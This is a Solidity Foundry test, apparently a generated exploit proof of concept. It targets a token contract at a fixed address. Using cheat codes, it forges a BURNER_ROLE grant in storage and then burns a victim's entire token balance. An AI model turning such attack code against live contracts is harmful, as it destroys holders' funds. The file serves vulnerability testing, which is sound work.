interface ISecondToken {
    function burn(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function hasRole(bytes32 role, address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required as variables are defined in the template
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // 1. Setup Victim
        address victim = address(0x1337);
        vm.label(victim, "Victim");

        // 2. Inject tokens into victim using deal (1000 FIT tokens)
        uint256 victimInitialBalance = 1000 * 10**18;
        deal(TARGET, victim, victimInitialBalance);

        // 3. Grant BURNER_ROLE to the attacker contract via storage injection
        // Role calculation: 
        // Mapping _roles is at slot 5
        // RoleData struct: mapping members (offset 0), bytes32 adminRole (offset 1)
        bytes32 burnerRole = keccak256("BURNER_ROLE");
        bytes32 rootSlot = keccak256(abi.encode(burnerRole, uint256(5)));
        bytes32 memberSlot = keccak256(abi.encode(attacker, rootSlot));
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // 4. Verify role was granted
        require(ISecondToken(TARGET).hasRole(burnerRole, attacker), "Role injection failed");

        // 5. Execute exploit: Burn victim's entire balance
        ISecondToken(TARGET).burn(victim, victimInitialBalance);

        // 6. Oracle Check: Victim balance should be 0
        uint256 victimFinalBalance = ISecondToken(TARGET).balanceOf(victim);
        assertEq(victimFinalBalance, 0, "Victim balance should be wiped out");
        assertEq(ISecondToken(TARGET).balanceOf(victim), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

